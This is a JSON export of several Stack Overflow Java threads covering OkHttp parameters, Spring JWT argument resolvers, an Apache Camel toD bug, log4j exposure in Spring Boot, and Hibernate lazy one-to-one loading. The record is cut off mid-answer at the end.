{"items":[{"tags":["java","android","okhttp"],"comments":[{"owner":{"account_id":74704,"reputation":11534,"user_id":214525,"accept_rate":100,"display_name":"f1sh"},"score":1,"creation_date":1640274327,"post_id":70464190,"comment_id":124559808,"body_markdown":"&quot;OkHttp&#39;s request body require static parameters&quot; - why?","body":"&quot;OkHttp&#39;s request body require static parameters&quot; - why?"},{"owner":{"account_id":39846,"reputation":991143,"user_id":115145,"accept_rate":84,"display_name":"CommonsWare"},"score":0,"creation_date":1640277378,"post_id":70464190,"comment_id":124560843,"body_markdown":"Your [mcve] should show your OkHttp-related code and explain what you mean by static parameters.","body":"Your <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> should show your OkHttp-related code and explain what you mean by static parameters."},{"owner":{"account_id":23503146,"reputation":11,"user_id":17552772,"display_name":"nubm3rcy"},"score":0,"creation_date":1640349832,"post_id":70464190,"comment_id":124574992,"body_markdown":"It might seem that the OkHttp module is not the problem, I don&#39;t know whether MainActivity class is. However, when I tried to switch the login function to another class, the problem was still there.","body":"It might seem that the OkHttp module is not the problem, I don&#39;t know whether MainActivity class is. However, when I tried to switch the login function to another class, the problem was still there."}],"owner":{"account_id":23503146,"reputation":11,"user_id":17552772,"display_name":"nubm3rcy"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":38,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":0,"score":1,"last_activity_date":1640273471,"creation_date":1640273471,"question_id":70464190,"body_markdown":"I&#39;m planning to make API requests in my application. Though, OkHttp&#39;s request body require static parameters, but the params I&#39;m trying to fit in is not static.\r\nHere is the code of the non-static string I want to add as parameter:\r\n```\r\npublic String HWID(){\r\n        if (!initial_run()) {\r\n            return const_HWID;\r\n        } else {\r\n            String manufacturer = Build.MANUFACTURER;\r\n            String unique = UUID.randomUUID().toString();\r\n            return manufacturer.charAt(0) + &quot;-&quot; + unique;\r\n        }\r\n    }\r\n```\r\nThe initial_run boolean is also non-static as it requires some of the File components:\r\n```\r\npublic boolean initial_run(){\r\n        if (file.exists()) return false;\r\n        else{\r\n            try {\r\n                FileOutputStream fos;\r\n                fos = context.openFileOutput(&quot;/storage/emulated/0/Download/content.txt&quot;, Context.MODE_PRIVATE);\r\n                fos.write(HWID().getBytes(StandardCharsets.UTF_8));\r\n                fos.close();\r\n                const_HWID = HWID();\r\n            }\r\n            catch (IOException e){\r\n                e.printStackTrace();\r\n            }\r\n            return true;\r\n        }\r\n    }\r\n```\r\nI appreciate any answer that may help me out.","title":"Is there anyway to make OkHttp request not static?","body":"<p>I'm planning to make API requests in my application. Though, OkHttp's request body require static parameters, but the params I'm trying to fit in is not static.\nHere is the code of the non-static string I want to add as parameter:</p>\n<pre><code>public String HWID(){\n        if (!initial_run()) {\n            return const_HWID;\n        } else {\n            String manufacturer = Build.MANUFACTURER;\n            String unique = UUID.randomUUID().toString();\n            return manufacturer.charAt(0) + &quot;-&quot; + unique;\n        }\n    }\n</code></pre>\n<p>The initial_run boolean is also non-static as it requires some of the File components:</p>\n<pre><code>public boolean initial_run(){\n        if (file.exists()) return false;\n        else{\n            try {\n                FileOutputStream fos;\n                fos = context.openFileOutput(&quot;/storage/emulated/0/Download/content.txt&quot;, Context.MODE_PRIVATE);\n                fos.write(HWID().getBytes(StandardCharsets.UTF_8));\n                fos.close();\n                const_HWID = HWID();\n            }\n            catch (IOException e){\n                e.printStackTrace();\n            }\n            return true;\n        }\n    }\n</code></pre>\n<p>I appreciate any answer that may help me out.</p>\n"},{"tags":["java","spring-boot","spring-security"],"answers":[{"tags":[],"owner":{"account_id":2256668,"reputation":590,"user_id":1987724,"accept_rate":63,"display_name":"Fam"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1640273458,"creation_date":1640273126,"answer_id":70464126,"question_id":70207362,"body_markdown":"I figured it out with some help from a professional acquaintance. The trick was to grab the static security context which allows you to get ahold of the current authentication. Then, getting the `uid` claim I was looking for was trivial.\r\n\r\nI used a Baeldung article to help me scaffold the `HandlerMethodArgumentResolver`: https://www.baeldung.com/spring-mvc-custom-data-binder#1-custom-argument-resolver\r\n\r\nAnd here is what I did in the `resolveArgument` method:\r\n\r\n    @Override\r\n    public Object resolveArgument(\r\n        MethodParameter parameter,\r\n        ModelAndViewContainer mavContainer,\r\n        NativeWebRequest webRequest,\r\n        WebDataBinderFactory binderFactory)\r\n        throws Exception {\r\n      final var auth = (JwtAuthenticationToken) SecurityContextHolder.getContext().getAuthentication();\r\n      final var token = auth.getToken();\r\n      if (token.hasClaim(&quot;uid&quot;)) {\r\n        return token.getClaimAsString(&quot;uid&quot;);\r\n      } else {\r\n        return null;\r\n      }\r\n    }","title":"How do I get a JwtAuthenticationToken for my HandlerMethodArgumentResolver from the request&#39;s Authorization header?","body":"<p>I figured it out with some help from a professional acquaintance. The trick was to grab the static security context which allows you to get ahold of the current authentication. Then, getting the <code>uid</code> claim I was looking for was trivial.</p>\n<p>I used a Baeldung article to help me scaffold the <code>HandlerMethodArgumentResolver</code>: <a href=\"https://www.baeldung.com/spring-mvc-custom-data-binder#1-custom-argument-resolver\" rel=\"nofollow noreferrer\">https://www.baeldung.com/spring-mvc-custom-data-binder#1-custom-argument-resolver</a></p>\n<p>And here is what I did in the <code>resolveArgument</code> method:</p>\n<pre><code>@Override\npublic Object resolveArgument(\n    MethodParameter parameter,\n    ModelAndViewContainer mavContainer,\n    NativeWebRequest webRequest,\n    WebDataBinderFactory binderFactory)\n    throws Exception {\n  final var auth = (JwtAuthenticationToken) SecurityContextHolder.getContext().getAuthentication();\n  final var token = auth.getToken();\n  if (token.hasClaim(&quot;uid&quot;)) {\n    return token.getClaimAsString(&quot;uid&quot;);\n  } else {\n    return null;\n  }\n}\n</code></pre>\n"}],"owner":{"account_id":2256668,"reputation":590,"user_id":1987724,"accept_rate":63,"display_name":"Fam"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":2880,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70464126,"answer_count":1,"score":0,"last_activity_date":1640273458,"creation_date":1638484925,"question_id":70207362,"body_markdown":"I have a Spring Boot application that requires a `JwtAuthenticationToken` passed in a HTTP `Authorization` header. The header itself provides a bearer token; Spring is doing some magic that I am currently unaware of to convert that bearer token string into a `JwtAuthenticationToken`. I have some code that extracts the user id from the token, which is used to locate the correct resources on the server.\r\n```java\r\nprivate String getUidFromToken(JwtAuthenticationToken token) {\r\n  // this is placeholder code to demonstrate what I&#39;m doing with the token\r\n}\r\n\r\npublic ResponseEntity&lt;String&gt; getUserProfile(JwtAuthenticationToken token) {\r\n  String uid = getUidFromToken(token);\r\n  // rest of the code\r\n}\r\n```\r\nSince I require these tokens in a couple of different places, I decided to look into moving the `getUidFromToken` code into a `HandlerMethodArgumentResolver`. The trouble I&#39;m having is that I need a `JwtAuthenticationToken`, but I only get the bearer token from the `Authorization` header as a string.\r\n\r\nIs it possible for me to get that `JwtAuthenticationToken` instead of a string?","title":"How do I get a JwtAuthenticationToken for my HandlerMethodArgumentResolver from the request&#39;s Authorization header?","body":"<p>I have a Spring Boot application that requires a <code>JwtAuthenticationToken</code> passed in a HTTP <code>Authorization</code> header. The header itself provides a bearer token; Spring is doing some magic that I am currently unaware of to convert that bearer token string into a <code>JwtAuthenticationToken</code>. I have some code that extracts the user id from the token, which is used to locate the correct resources on the server.</p>\n<pre class=\"lang-java prettyprint-override\"><code>private String getUidFromToken(JwtAuthenticationToken token) {\n  // this is placeholder code to demonstrate what I'm doing with the token\n}\n\npublic ResponseEntity&lt;String&gt; getUserProfile(JwtAuthenticationToken token) {\n  String uid = getUidFromToken(token);\n  // rest of the code\n}\n</code></pre>\n<p>Since I require these tokens in a couple of different places, I decided to look into moving the <code>getUidFromToken</code> code into a <code>HandlerMethodArgumentResolver</code>. The trouble I'm having is that I need a <code>JwtAuthenticationToken</code>, but I only get the bearer token from the <code>Authorization</code> header as a string.</p>\n<p>Is it possible for me to get that <code>JwtAuthenticationToken</code> instead of a string?</p>\n"},{"tags":["java","apache-camel"],"comments":[{"owner":{"account_id":11715536,"reputation":4839,"user_id":8576169,"display_name":"Bedla"},"score":0,"creation_date":1534020832,"post_id":51798550,"comment_id":90563416,"body_markdown":"Make sure, you have upgraded `camel-http4` dependency to version `2.22.0`. All components must be always imported with same version as `camel-core`.","body":"Make sure, you have upgraded <code>camel-http4</code> dependency to version <code>2.22.0</code>. All components must be always imported with same version as <code>camel-core</code>."},{"owner":{"account_id":5824285,"reputation":41,"user_id":4591254,"display_name":"praveenp"},"score":0,"creation_date":1534055601,"post_id":51798550,"comment_id":90568144,"body_markdown":"Yes all components are for same version. In Karaf, once you add camel repository of a specific version, all components will also be installed for the same version. It was a fresh Karaf installation with no Camel features, then I installed 2.22.0","body":"Yes all components are for same version. In Karaf, once you add camel repository of a specific version, all components will also be installed for the same version. It was a fresh Karaf installation with no Camel features, then I installed 2.22.0"},{"owner":{"account_id":176018,"reputation":56316,"user_id":406429,"display_name":"Claus Ibsen"},"score":0,"creation_date":1534176788,"post_id":51798550,"comment_id":90607378,"body_markdown":"We fixed a bug on 2.22.0 that goes into 2.22.1 about issue in toD. You can use recipientList as workaround.","body":"We fixed a bug on 2.22.0 that goes into 2.22.1 about issue in toD. You can use recipientList as workaround."},{"owner":{"account_id":5824285,"reputation":41,"user_id":4591254,"display_name":"praveenp"},"score":0,"creation_date":1534275763,"post_id":51798550,"comment_id":90650661,"body_markdown":"Thank you Claus! appreciate it. Using recipientList at the moment. Will take 2.22.1 when its out.","body":"Thank you Claus! appreciate it. Using recipientList at the moment. Will take 2.22.1 when its out."},{"owner":{"account_id":241879,"reputation":10776,"user_id":512993,"accept_rate":90,"display_name":"Ho&#224;ng Long"},"score":0,"creation_date":1540528912,"post_id":51798550,"comment_id":92907222,"body_markdown":"Hi praveenp, we have the same problem. How did you solve it without ToD?","body":"Hi praveenp, we have the same problem. How did you solve it without ToD?"},{"owner":{"account_id":5824285,"reputation":41,"user_id":4591254,"display_name":"praveenp"},"score":0,"creation_date":1540634683,"post_id":51798550,"comment_id":92943865,"body_markdown":"You need to use reciepientList. Check the question, I have given example for using recipientList instead of toD. Even though I have shown constant header in the above example, you can set any header dynamically and use that in the https4:// url in the recipientLIst.","body":"You need to use reciepientList. Check the question, I have given example for using recipientList instead of toD. Even though I have shown constant header in the above example, you can set any header dynamically and use that in the https4:// url in the recipientLIst."},{"owner":{"account_id":4202695,"reputation":517,"user_id":3442423,"accept_rate":62,"display_name":"&#216;ystein W."},"score":0,"creation_date":1545222014,"post_id":51798550,"comment_id":94549555,"body_markdown":"Sorry about the late comment, but this is still an issue in 2.23. Did you not add the fix in 2.23, @ClausIbsen","body":"Sorry about the late comment, but this is still an issue in 2.23. Did you not add the fix in 2.23, @ClausIbsen"},{"owner":{"account_id":5824285,"reputation":41,"user_id":4591254,"display_name":"praveenp"},"score":0,"creation_date":1564772221,"post_id":51798550,"comment_id":101154051,"body_markdown":"After searching through code, I can see that catalog feature was added sometime after 2.16, and toD seems to be dependent on catalog to load properties from json for the http component. Even though I have not tried this yet, this problem should be solved by installing the camel-catalog feature in osgi container like karaf, or by including it in the maven dependencies like any other camel component. I am unable to find any documentation of this dependency, all I could find was a small section in the camel tooling here: [link](https://camel.apache.org/tools.html)","body":"After searching through code, I can see that catalog feature was added sometime after 2.16, and toD seems to be dependent on catalog to load properties from json for the http component. Even though I have not tried this yet, this problem should be solved by installing the camel-catalog feature in osgi container like karaf, or by including it in the maven dependencies like any other camel component. I am unable to find any documentation of this dependency, all I could find was a small section in the camel tooling here: <a href=\"https://camel.apache.org/tools.html\" rel=\"nofollow noreferrer\">link</a>"}],"answers":[{"tags":[],"owner":{"account_id":11978386,"reputation":1,"user_id":8764897,"display_name":"Massimiliano Fatticcioni"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640272770,"creation_date":1640272770,"answer_id":70464064,"question_id":51798550,"body_markdown":"I solved this problem by putting the component inside a header that I used in the toD.\r\nExample:\r\n\r\n    &lt;route&gt;\r\n        &lt;from uri=&quot;timer://foo?fixedRate=true&amp;amp;period=1000&quot;/&gt;\r\n        &lt;setHeader headerName=&quot;SMSURI&quot;&gt;\r\n            &lt;constant&gt;https4://localhost:9090/&lt;/constant&gt;\r\n        &lt;/setHeader&gt;\r\n        &lt;toD uri=&quot;${headers.SMSURI}&quot; /&gt;\r\n    &lt;/route&gt;","title":"camel-http4 2.22 - toD not working","body":"<p>I solved this problem by putting the component inside a header that I used in the toD.\nExample:</p>\n<pre><code>&lt;route&gt;\n    &lt;from uri=&quot;timer://foo?fixedRate=true&amp;amp;period=1000&quot;/&gt;\n    &lt;setHeader headerName=&quot;SMSURI&quot;&gt;\n        &lt;constant&gt;https4://localhost:9090/&lt;/constant&gt;\n    &lt;/setHeader&gt;\n    &lt;toD uri=&quot;${headers.SMSURI}&quot; /&gt;\n&lt;/route&gt;\n</code></pre>\n"}],"owner":{"account_id":5824285,"reputation":41,"user_id":4591254,"display_name":"praveenp"},"comment_count":8,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":2151,"favorite_count":0,"down_vote_count":0,"up_vote_count":4,"answer_count":1,"score":4,"last_activity_date":1640272770,"creation_date":1533981759,"question_id":51798550,"body_markdown":"The camel dynamic uri in dynamic route (toD) seem to have stopped working for me after migrating to 2.22.0 (from 2.16.5). The test route that demonstrates the issue:\r\n\r\n    &lt;route&gt;\r\n    \t&lt;from uri=&quot;timer://foo?fixedRate=true&amp;amp;period=1000&quot;/&gt;\r\n    \t&lt;setHeader headerName=&quot;SMSURI&quot;&gt;\r\n    \t\t&lt;constant&gt;localhost:9090/&lt;/constant&gt;\r\n    \t&lt;/setHeader&gt;\r\n    \t&lt;toD uri=&quot;https4://${header.SMSURI}?throwExceptionOnFailure=false&quot;/&gt;\r\n    &lt;/route&gt;\r\n\r\nAnd I get the following exception:\r\n\r\n    2018-08-11T14:41:07,770 | INFO  | Camel (testContext) thread #27 - timer://foo | route5                           | 160 - org.apache.camel.camel-core - 2.22.0 | java.lang.IllegalArgumentException: Cannot find endpoint with scheme https4\r\n    \tat org.apache.camel.runtimecatalog.AbstractCamelCatalog.endpointProperties(AbstractCamelCatalog.java:529)\r\n    \tat org.apache.camel.http.common.HttpSendDynamicAware.prepare(HttpSendDynamicAware.java:57)\r\n    \tat org.apache.camel.processor.SendDynamicProcessor.process(SendDynamicProcessor.java:118)\r\n    \tat org.apache.camel.processor.RedeliveryErrorHandler.process(RedeliveryErrorHandler.java:548)\r\n    \tat org.apache.camel.processor.CamelInternalProcessor.process(CamelInternalProcessor.java:201)\r\n    \tat org.apache.camel.processor.Pipeline.process(Pipeline.java:138)\r\n    \tat org.apache.camel.processor.Pipeline.process(Pipeline.java:101)\r\n    \tat org.apache.camel.processor.CamelInternalProcessor.process(CamelInternalProcessor.java:201)\r\n    \tat org.apache.camel.component.timer.TimerConsumer.sendTimerExchange(TimerConsumer.java:197)\r\n    \tat org.apache.camel.component.timer.TimerConsumer$1.run(TimerConsumer.java:79)\r\n    \tat java.util.TimerThread.mainLoop(Timer.java:555)\r\n    \tat java.util.TimerThread.run(Timer.java:505)\r\n\r\n\r\nI know there are two alternative ways for dynamic uri, one is to set Exchange.HTTP_URI and then use the static route &#39;to&#39; with an arbitrary url, the second one is to use reciepientList. However, I do not like the first option of using &#39;to&#39;, as I need to set an arbitrary url. I am currently using the second option, receipientList something like this (Note that setHeader is used here only for demo. The url is dynamically retrieved and set in a processor class in my project):\r\n\r\n    &lt;route&gt;\r\n    \t&lt;from uri=&quot;timer://foo?fixedRate=true&amp;amp;period=1000&quot;/&gt;\r\n    \t&lt;setHeader headerName=&quot;SMSURI&quot;&gt;\r\n    \t\t&lt;constant&gt;localhost:9090/&lt;/constant&gt;\r\n    \t&lt;/setHeader&gt;\r\n    \t&lt;recipientList&gt;\r\n    \t\t&lt;simple&gt;https4://${header.SMSURI}?throwExceptionOnFailure=false&lt;/simple&gt;\r\n    \t&lt;/recipientList&gt;\r\n    &lt;/route&gt;\r\n\r\nand this works. However, I really liked the toD option.\r\n\r\nAlso, camel website says:\r\n\r\n&gt; Dynamic To - out of the box\r\n&gt; \r\n&gt; From Camel 2.16 onwards there is a new &lt;toD&gt; which is a dynamic to.\r\n&gt; See more details at Message Endpoint.\r\n\r\n[http://camel.apache.org/how-to-use-a-dynamic-uri-in-to.html][1]\r\n\r\nCan any one help me understand whether the support has been removed for toD with http4? Or this is a bug?\r\n\r\nPS: I am running this from within a Karaf 4.2 container inside OSGI bundle, using blueprint xml.\r\n\r\n\r\n  [1]: http://camel.apache.org/how-to-use-a-dynamic-uri-in-to.html","title":"camel-http4 2.22 - toD not working","body":"<p>The camel dynamic uri in dynamic route (toD) seem to have stopped working for me after migrating to 2.22.0 (from 2.16.5). The test route that demonstrates the issue:</p>\n\n<pre><code>&lt;route&gt;\n    &lt;from uri=\"timer://foo?fixedRate=true&amp;amp;period=1000\"/&gt;\n    &lt;setHeader headerName=\"SMSURI\"&gt;\n        &lt;constant&gt;localhost:9090/&lt;/constant&gt;\n    &lt;/setHeader&gt;\n    &lt;toD uri=\"https4://${header.SMSURI}?throwExceptionOnFailure=false\"/&gt;\n&lt;/route&gt;\n</code></pre>\n\n<p>And I get the following exception:</p>\n\n<pre><code>2018-08-11T14:41:07,770 | INFO  | Camel (testContext) thread #27 - timer://foo | route5                           | 160 - org.apache.camel.camel-core - 2.22.0 | java.lang.IllegalArgumentException: Cannot find endpoint with scheme https4\n    at org.apache.camel.runtimecatalog.AbstractCamelCatalog.endpointProperties(AbstractCamelCatalog.java:529)\n    at org.apache.camel.http.common.HttpSendDynamicAware.prepare(HttpSendDynamicAware.java:57)\n    at org.apache.camel.processor.SendDynamicProcessor.process(SendDynamicProcessor.java:118)\n    at org.apache.camel.processor.RedeliveryErrorHandler.process(RedeliveryErrorHandler.java:548)\n    at org.apache.camel.processor.CamelInternalProcessor.process(CamelInternalProcessor.java:201)\n    at org.apache.camel.processor.Pipeline.process(Pipeline.java:138)\n    at org.apache.camel.processor.Pipeline.process(Pipeline.java:101)\n    at org.apache.camel.processor.CamelInternalProcessor.process(CamelInternalProcessor.java:201)\n    at org.apache.camel.component.timer.TimerConsumer.sendTimerExchange(TimerConsumer.java:197)\n    at org.apache.camel.component.timer.TimerConsumer$1.run(TimerConsumer.java:79)\n    at java.util.TimerThread.mainLoop(Timer.java:555)\n    at java.util.TimerThread.run(Timer.java:505)\n</code></pre>\n\n<p>I know there are two alternative ways for dynamic uri, one is to set Exchange.HTTP_URI and then use the static route 'to' with an arbitrary url, the second one is to use reciepientList. However, I do not like the first option of using 'to', as I need to set an arbitrary url. I am currently using the second option, receipientList something like this (Note that setHeader is used here only for demo. The url is dynamically retrieved and set in a processor class in my project):</p>\n\n<pre><code>&lt;route&gt;\n    &lt;from uri=\"timer://foo?fixedRate=true&amp;amp;period=1000\"/&gt;\n    &lt;setHeader headerName=\"SMSURI\"&gt;\n        &lt;constant&gt;localhost:9090/&lt;/constant&gt;\n    &lt;/setHeader&gt;\n    &lt;recipientList&gt;\n        &lt;simple&gt;https4://${header.SMSURI}?throwExceptionOnFailure=false&lt;/simple&gt;\n    &lt;/recipientList&gt;\n&lt;/route&gt;\n</code></pre>\n\n<p>and this works. However, I really liked the toD option.</p>\n\n<p>Also, camel website says:</p>\n\n<blockquote>\n  <p>Dynamic To - out of the box</p>\n  \n  <p>From Camel 2.16 onwards there is a new  which is a dynamic to.\n  See more details at Message Endpoint.</p>\n</blockquote>\n\n<p><a href=\"http://camel.apache.org/how-to-use-a-dynamic-uri-in-to.html\" rel=\"nofollow noreferrer\">http://camel.apache.org/how-to-use-a-dynamic-uri-in-to.html</a></p>\n\n<p>Can any one help me understand whether the support has been removed for toD with http4? Or this is a bug?</p>\n\n<p>PS: I am running this from within a Karaf 4.2 container inside OSGI bundle, using blueprint xml.</p>\n"},{"tags":["java","spring","spring-boot","gradle","log4j"],"answers":[{"tags":[],"owner":{"account_id":21083132,"reputation":3230,"user_id":15496965,"display_name":"Henning"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1640272477,"creation_date":1640272477,"answer_id":70463998,"question_id":70457498,"body_markdown":"Spring Boot does not have a dependency on the potentially vulnerable `log4j-core`. Only on the log4j artifacts `log4j-to-slf4j` and `log4j-api` which are not affected by the recent CVEs:\r\n\r\nhttps://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot\r\n\r\nFurthermore, Spring Boot 2.6.2 pulls in the latest releases of both logback (1.2.9) and log4j (2.17.0), which contain fixes for the recently published CVEs:\r\n\r\nhttps://github.com/spring-projects/spring-boot/releases/tag/v2.6.2","title":"I use Springboot. spring-boot-starter-data-jpa depends on log4j. Is it vulnerable?","body":"<p>Spring Boot does not have a dependency on the potentially vulnerable <code>log4j-core</code>. Only on the log4j artifacts <code>log4j-to-slf4j</code> and <code>log4j-api</code> which are not affected by the recent CVEs:</p>\n<p><a href=\"https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot\" rel=\"nofollow noreferrer\">https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot</a></p>\n<p>Furthermore, Spring Boot 2.6.2 pulls in the latest releases of both logback (1.2.9) and log4j (2.17.0), which contain fixes for the recently published CVEs:</p>\n<p><a href=\"https://github.com/spring-projects/spring-boot/releases/tag/v2.6.2\" rel=\"nofollow noreferrer\">https://github.com/spring-projects/spring-boot/releases/tag/v2.6.2</a></p>\n"}],"owner":{"account_id":19191072,"reputation":135,"user_id":14020792,"display_name":"vr_min_chan"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":301,"favorite_count":0,"down_vote_count":1,"up_vote_count":0,"answer_count":1,"score":-1,"last_activity_date":1640272477,"creation_date":1640231832,"question_id":70457498,"body_markdown":"Thank you.\r\n\r\nI use Springboot and gradle.\r\nspring-boot-starter-data-jpa depends on log4j.\r\nIs it vulnerable?\r\n\r\nbuild.gradle\r\n```\r\ndependencies {\r\n    compile(&#39;org.springframework.boot:spring-boot-starter-data-jpa:2.6.2&#39;)\r\n}\r\n```\r\n\r\n\r\nI haven&#39;t changed the log output settings in application.properties.\r\n\r\nIf it&#39;s not vulnerable, I want that source.","title":"I use Springboot. spring-boot-starter-data-jpa depends on log4j. Is it vulnerable?","body":"<p>Thank you.</p>\n<p>I use Springboot and gradle.\nspring-boot-starter-data-jpa depends on log4j.\nIs it vulnerable?</p>\n<p>build.gradle</p>\n<pre><code>dependencies {\n    compile('org.springframework.boot:spring-boot-starter-data-jpa:2.6.2')\n}\n</code></pre>\n<p>I haven't changed the log output settings in application.properties.</p>\n<p>If it's not vulnerable, I want that source.</p>\n"},{"tags":["java","spring-boot","spring-data-jpa","jpa-2.0","one-to-one"],"comments":[{"owner":{"account_id":10976667,"reputation":1238,"user_id":8065149,"accept_rate":88,"display_name":"cjnash"},"score":0,"creation_date":1639940423,"post_id":70414424,"comment_id":124470927,"body_markdown":"your `Output` there - how are you serializing the data into that object? or is that just a json return from your select statement.","body":"your <code>Output</code> there - how are you serializing the data into that object? or is that just a json return from your select statement."},{"owner":{"account_id":5449054,"reputation":1020,"user_id":4334502,"accept_rate":30,"display_name":"ever alian"},"score":0,"creation_date":1639943227,"post_id":70414424,"comment_id":124471588,"body_markdown":"@cjnash   It&#39;s the output from my rest controller. from postman.","body":"@cjnash   It&#39;s the output from my rest controller. from postman."},{"owner":{"account_id":10976667,"reputation":1238,"user_id":8065149,"accept_rate":88,"display_name":"cjnash"},"score":0,"creation_date":1639943631,"post_id":70414424,"comment_id":124471689,"body_markdown":"Just a thought here, maybe when the object is getting serialized, the getter() is being called, thus triggering the load. You could check this by debugging and checking what the query returns vs what you are returning via rest.\nI could be wrong though.","body":"Just a thought here, maybe when the object is getting serialized, the getter() is being called, thus triggering the load. You could check this by debugging and checking what the query returns vs what you are returning via rest. I could be wrong though."},{"owner":{"account_id":476019,"reputation":14699,"user_id":886697,"accept_rate":92,"display_name":"Stanislav Bashkyrtsev"},"score":0,"creation_date":1640207724,"post_id":70414424,"comment_id":124543782,"body_markdown":"Don&#39;t get your question - what did you expect? Jackson will access the property and this causes the association to load. Did you expect something else? What exactly? Also, where are your `@Transactional`?","body":"Don&#39;t get your question - what did you expect? Jackson will access the property and this causes the association to load. Did you expect something else? What exactly? Also, where are your <code>@Transactional</code>?"}],"answers":[{"tags":[],"owner":{"account_id":9763630,"reputation":16595,"user_id":7237884,"display_name":"Panagiotis Bougioukos"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1640250855,"creation_date":1639949614,"answer_id":70415506,"question_id":70414424,"body_markdown":"I thought I had the answer about this question, thinking it was just Jackson calling the getter during serialization for response object and that had as a result the fetch of the lazy property but it seems that this is not the case!!\r\n\r\nThis question was a good reason to dig and learn something strange from documentation.\r\n\r\nThe most common ORM vendor is hibernate. So if you read the documentation on hibernate it clearly states that **EAGER type is a must conform** for Hibernate, **but the LAZY fetch type is just a hint that hibernate may or may not follow** **!!**\r\n\r\nFrom the [hibernate doc][1]\r\n\r\n&gt; fetch - FetchType \r\n&gt;\r\n&gt; (defaults to EAGER) Defines whether this attribute\r\n&gt; should be fetched eagerly or lazily. **JPA says that EAGER is a\r\n&gt; requirement to the provider (Hibernate) that the value should be\r\n&gt; fetched when the owner is fetched, while LAZY is merely a hint that\r\n&gt; the value is fetched when the attribute is accessed**. **Hibernate ignores\r\n&gt; this setting for basic types unless you are using bytecode\r\n&gt; enhancement**. See the Bytecode Enhancement for additional information\r\n&gt; on fetching and on bytecode enhancement.\r\n\r\nAlso according to the doc,  you have to follow at least for now the bytecode enhancment in order for lazy loading to work\r\n\r\n&gt; As a hopefully temporary legacy hold-over, it is currently required\r\n&gt; that all lazy singular associations (many-to-one and one-to-one) also\r\n&gt; include **@LazyToOne(LazyToOneOption.NO_PROXY)**. The plan is to relax\r\n&gt; that requirement later.\r\n\r\nAlso according to [hibernate performance enhancement doc][2] you also need a configuration property for hibernate, so in a Spring Boot App, please also include the following in your application.yml or properties file.\r\n\r\n    hibernate.enhancer.enableLazyInitialization = true\r\n\r\nAfter you include this property, your entity must be updated to \r\n\r\n    @Entity\r\n    public class User extends AbstractEntity implements Serializable{\r\n    \r\n        // Other fields related to user entity go here ..\r\n    \r\n        @LazyToOne(LazyToOneOption.NO_PROXY)  &lt;------\r\n        @OneToOne(cascade = CascadeType.ALL, fetch = FetchType.LAZY, optional = false)\r\n        @JoinColumn(name = &quot;account_no&quot;, referencedColumnName = &quot;account_number&quot;)\r\n        private Account account;\r\n    }\r\n\r\n    @Entity\r\n    public class Account extends AbstractEntity implements Serializable{\r\n    \r\n        // fields like account#, balance etc goes here..\r\n    \r\n        @LazyToOne(LazyToOneOption.NO_PROXY) &lt;-----\r\n        @OneToOne (fetch = FetchType.LAZY)\r\n        private User user;\r\n    \r\n    }\r\n\r\nAll these are needed just for hibernate to enable the lazy loading functionality. \r\n\r\nThen you would still see it in your response, because Jackson would call the getter method while serializing so it will force hibernate to fetch the value. So you also need to inform jackson to not use this getter during serialization.\r\n\r\nSo you must also update\r\n\r\n      @Entity\r\n      public class User extends AbstractEntity implements Serializable{\r\n    \r\n        @JsonIgnore &lt;--------\r\n        @JsonProperty(access =  JsonProperty.Access.WRITE_ONLY) &lt;-------\r\n        @LazyToOne(LazyToOneOption.NO_PROXY) \r\n        @OneToOne(cascade = CascadeType.ALL, fetch = FetchType.LAZY, optional = false)\r\n        @JoinColumn(name = &quot;account_no&quot;, referencedColumnName = &quot;account_number&quot;)\r\n        private Account account; \r\n\r\nHopefully after all this should you be able to not see the account response because of lazy loading.\r\n\r\n  [1]: https://docs.jboss.org/hibernate/orm/5.4/userguide/html_single/Hibernate_User_Guide.html#basic-column-annotation\r\n  [2]: https://docs.jboss.org/hibernate/orm/5.4/userguide/html_single/Hibernate_User_Guide.html#BytecodeEnhancement-enhancement","title":"FetchType.LAZY not working for @OneToOne relation","body":"<p>I thought I had the answer about this question, thinking it was just Jackson calling the getter during serialization for response object and that had as a result the fetch of the lazy property but it seems that this is not the case!!</p>\n<p>This question was a good reason to dig and learn something strange from documentation.</p>\n<p>The most common ORM vendor is hibernate. So if you read the documentation on hibernate it clearly states that <strong>EAGER type is a must conform</strong> for Hibernate, <strong>but the LAZY fetch type is just a hint that hibernate may or may not follow</strong> <strong>!!</strong></p>\n<p>From the <a href=\"https://docs.jboss.org/hibernate/orm/5.4/userguide/html_single/Hibernate_User_Guide.html#basic-column-annotation\" rel=\"nofollow noreferrer\">hibernate doc</a></p>\n<blockquote>\n<p>fetch - FetchType</p>\n<p>(defaults to EAGER) Defines whether this attribute\nshould be fetched eagerly or lazily. <strong>JPA says that EAGER is a\nrequirement to the provider (Hibernate) that the value should be\nfetched when the owner is fetched, while LAZY is merely a hint that\nthe value is fetched when the attribute is accessed</strong>. <strong>Hibernate ignores\nthis setting for basic types unless you are using bytecode\nenhancement</strong>. See the Bytecode Enhancement for additional information\non fetching and on bytecode enhancement.</p>\n</blockquote>\n<p>Also according to the doc,  you have to follow at least for now the bytecode enhancment in order for lazy loading to work</p>\n<blockquote>\n<p>As a hopefully temporary legacy hold-over, it is currently required\nthat all lazy singular associations (many-to-one and one-to-one) also\ninclude <strong>@LazyToOne(LazyToOneOption.NO_PROXY)</strong>. The plan is to relax\nthat requirement later.</p>\n</blockquote>\n<p>Also according to <a 